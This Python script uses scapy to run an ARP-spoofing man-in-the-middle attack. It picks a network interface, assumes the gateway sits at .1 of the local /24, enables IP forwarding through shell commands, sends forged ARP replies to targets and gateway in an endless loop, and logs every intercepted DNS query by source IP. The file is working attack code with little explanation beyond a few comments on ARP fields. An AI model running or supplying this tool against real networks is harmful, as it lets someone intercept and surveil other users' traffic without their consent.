import logging
from scapy.all import ARP , send , sniff , conf , show_interfaces
from scapy.layers.dns import DNS , DNSQR , IP 
import threading
import subprocess
import psutil
import os
import platform


logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def select_interface():
    from scapy.all import conf
    import platform
    
    current_os = platform.system()
    print(f"\n[*] Scanning for physical Network Interfaces on {current_os}...")
    print("-" * 85)
    
    # Filter out virtual, tunnel, and loopback adapters
    vm_keywords = ['virtual', 'vmware', 'hyper-v', 'vbox', 'virtualbox', 'loopback', 'pseudo', 'teredo', 'tunnel', 'docker', 'lo']
    valid_ifaces = {}
    
    print(f"{'ID/Name':<10} | {'Description':<45} | {'IP Address'}")
    print("-" * 85)
    
    for iface in conf.ifaces.values():
        desc = getattr(iface, 'description', "").lower()
        name = iface.name.lower()
        
       
        if not any(word in desc for word in vm_keywords) and not any(word in name for word in vm_keywords):
            key = str(iface.index) if current_os == "Windows" else iface.name
            valid_ifaces[key] = iface
            
            ip = iface.ip if iface.ip else "0.0.0.0"
           
            display_name = iface.description[:43] if current_os == "Windows" else iface.name
            print(f"{key:<10} | {display_name:<45} | {ip}")
            
    print("-" * 85)
    
    try:
        global idx_or_name
        global auto_target_IP
        global auto_gateway_IP
        
       
        idx_or_name = "[?] Enter the Index: " if current_os == "Windows" else "[?] Enter the Interface Name: "
        user_input = input(idx_or_name)
        
        if user_input in valid_ifaces:
            selected = valid_ifaces[user_input]
            idx_or_name = selected.index if current_os == "Windows" else selected.name
            my_ip = selected.ip if selected.ip else "0.0.0.0"
            
            ip_parts = my_ip.split('.')
            auto_target_IP = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.0/24"
            auto_gateway_IP = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.1"
            
           
            final_desc = selected.description if current_os == "Windows" else selected.name
            print(f"\n[!] Selected: {final_desc}")
            print(f"[+] My IP: {my_ip}")
            print(f"[+] Auto-set Range: {auto_target_IP}")
            print(f"[+] Auto-set Gateway: {auto_gateway_IP}")
            
            
            return selected.name, auto_target_IP, auto_gateway_IP
        else:
            print("[X] Error: Selection not found!")
            return None, None, None
            
    except Exception as e:
        print(f"[X] Error: {e}")
        return None, None, None
#-----------------------------------------------------
iface_name, target_IP, gateway_IP = select_interface()
if not iface_name:
    print("[X] No interface selected. Exiting...")
    exit()


def enable_ip_forwarding():
    print("[*] Enabling IP Forwarding...")
    if platform.system() == "Windows":
        cmd = "powershell.exe Set-NetIPInterface -Forwarding Enabled"
        subprocess.run(cmd, shell=True)
    else: # Linux
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

def disable_ip_forwarding():
    print("\n[*] Disabling IP Forwarding...")
    if platform.system() == "Windows":
        cmd = "powershell.exe Set-NetIPInterface -Forwarding Disabled"
        subprocess.run(cmd, shell=True)
    else: # Linux
        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
#-------------------------------------------------------
enable_ip_forwarding()

def arp_spoof(target_ip,spoof_ip):
    packet = ARP(op=2,pdst=target_ip,hwdst='ff:ff:ff:ff:ff:ff',psrc=spoof_ip)
    # ARP => ARP request | ARP Replay
    # OP =>    1 -------------  2
    # pdst => protocol distnation 
    # hwdst => hardware distnation => MAC | broadcast
    # psrc => protocol source 
    send(packet,verbose=False)

def dns_packet(packet):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr==0:
        ip_src = packet[IP].src
        dns_query = packet[DNSQR].qname.decode().strip('.')
        print(f"{ip_src:<15}>> {dns_query}") 
 
def start_arp(target_ip,getway_ip):
    while True:
        arp_spoof(target_ip,getway_ip) # show requests target ---> getway
        arp_spoof(getway_ip,target_ip) # show responses getway ---> target

    
target_IP = auto_target_IP   # range your IP
getway_IP = auto_gateway_IP      # Router IP

threading.Thread(target=start_arp,args=(target_IP,getway_IP),daemon=True).start()

    
print("[+] Network Traffic : ")
print("-"*40)
print(f"{'IP Address':<20}\t {'DNS Query':<30}")
print("-"*40)
try:
    print("[+] Sniffing started... Press Ctrl+C to stop.")
    sniff(iface=iface_name, filter="udp port 53", prn=dns_packet, store=0)
except KeyboardInterrupt:
    
    disable_ip_forwarding()
    print("[!] Exiting gracefully.")


disable_ip_forwarding()